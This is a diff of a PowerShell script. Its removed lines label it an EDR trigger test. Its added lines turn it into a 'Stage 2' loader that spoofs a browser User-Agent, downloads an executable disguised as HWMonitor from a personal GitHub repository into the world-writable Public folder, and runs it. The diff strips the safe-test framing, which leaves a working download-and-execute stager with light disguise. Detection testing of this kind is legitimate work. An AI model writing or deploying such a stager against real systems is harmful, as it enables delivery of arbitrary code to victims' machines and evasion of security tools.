@@ -1,23 +1,30 @@
-# Simulated Malicious Activity - EDR Trigger Test
-# Safe to run in an isolated testing environment
+# === Stage 2: Download binary from GitHub and execute ===
 
-# Define URL of a benign file (you can replace this with your own hosted file)
-$Url = "https://github.com/mibomboclaaat/wwdtesting/raw/refs/heads/main/hwmonitor_1.58.exe"
+# Force TLS 1.2 to ensure secure HTTPS connection works
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# Define world-writable path
-$Destination = "$env:PUBLIC\hwmonitor_1.58.exe"
+# URL to your raw GitHub binary file - replace with your actual raw URL
+$BinaryUrl = "https://github.com/mibomboclaaat/wwdtesting/raw/refs/heads/main/hwmonitor_1.58.exe"
 
-# Download the file using Invoke-WebRequest (commonly abused method)
+# Destination path for the binary (world-writable directory)
+$DestinationPath = "$env:PUBLIC\HWMonitor_x64.exe"
+
 try {
-    Invoke-WebRequest -Uri $Url -OutFile $Destination -UseBasicParsing
-    Write-Host "File downloaded to $Destination"
-} catch {
-    Write-Host "Download failed: $_"
+    Write-Host "[*] Starting download from GitHub..."
+    Invoke-WebRequest -Uri $BinaryUrl -OutFile $DestinationPath -Headers @{ "User-Agent" = "Mozilla/5.0" } -UseBasicParsing
+    Write-Host "[+] Downloaded binary to $DestinationPath"
+}
+catch {
+    Write-Host "[-] Failed to download the binary: $_"
+    exit 1
 }
 
-# Simulate execution (will just open the file in notepad if it's a text file)
 try {
-    Start-Process -FilePath $Destination
-    Write-Host "Simulated execution: $Destination"
-} catch {
-    Write-Host "Execution failed: $_"
+    Write-Host "[*] Executing the binary..."
+    Start-Process -FilePath $DestinationPath
+    Write-Host "[+] Binary execution started."
+}
+catch {
+    Write-Host "[-] Failed to execute the binary: $_"
+    exit 1
+}
